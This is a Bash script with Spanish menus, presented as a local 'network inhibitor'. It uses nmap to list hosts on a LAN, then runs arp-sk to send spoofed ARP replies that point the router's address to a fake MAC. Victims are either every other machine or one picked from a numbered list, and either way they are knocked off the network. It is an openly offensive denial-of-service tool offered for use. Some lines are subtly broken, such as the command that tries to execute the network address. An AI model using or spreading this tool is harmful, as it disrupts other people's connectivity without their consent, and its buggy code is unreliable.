vars=""
macvic=""
ownmac=`ifconfig | grep "ether" | cut -d " " -f 10`

clear
echo "+) Bienvenido al proyecto Jaribo un inhibidor de red a nivel local | v0.09("
echo " |------------------------------------------------------------------------|"
echo " |----------Dime la dirección del router y la mascara de red--------------|"
echo ""
read red
clear

echo "0)------------------------------------------------------------------------( "
echo " |-----------------------Dime el adaptador de red-------------------------|"
echo ""
ifconfig
echo ""
read ether
clear
while [ true ]
do
echo "+) Bienvenido al proyecto Jarius un inhibidor de red a nivel local | v0.5 (" 
echo " |------------------------------------------------------------------------|"
echo " |--------> Nodos de supresión apuntando a '$red' desde '$ether'"
echo " |------------------------------------------------------------------------|"
echo "0) Mostrar conexiones de la red.                                          |"
echo "1) Inhibir toda la red.                                                   |"
echo "2) Inhibir un nodo specifico.                                             |"
echo "3) Salir.                                                                 |"
echo " )------------------------------------------------------------------------("
read opt
clear

case $opt in
0)
echo "0)------------------------------------------------------------------------( "
	nmap -sP $red
echo "" 
echo " )------------------------------------------------------------------------( "
echo ""
;;
1)
	clear
	echo "1-)--------------------------- ACCIONANDO CONSOLAS ----------------------("
	for mac in `nmap -sP $red | grep "MAC" | cut -d " " -f 3`;
	do
		if [ $mac != $ownmac ];
			then
			xterm -e arp-sk -T u0 -r -i $ether -S `$red | cut -d "/" -f 1`:AA:BB:CC:DD:EE:FF -d $mac
		fi
	done
;;
2)
	clear
	while [ $macvic == $vars ]
	do
		nmap -sP $red | grep "MAC" | cut -d " " -f 3 > Usuarios_en_red.txt
		echo "0)------------------------------------------------------------------------( "
		nmap -sP $red | grep "MAC" | nl -ba
		echo "0)------------------------------------------------------------------------( "
		echo "2-) Seleccione a la victima, presione -Intro-  para refresacar la lista --("
		read macvic
		clear
	done
	echo "2-) Filtrando..                                                         -("
	mac=`cat Usuarios_en_red.txt | awk NR==$macvic`
	echo $mac
	echo "-Accionando..-"
	arp-sk -T u0 -r -i $ether -S `$red | cut -d "/" -f 1`:AA:BB:CC:DD:EE:FF -d $mac
;;
3)
exit
;;
esac
done
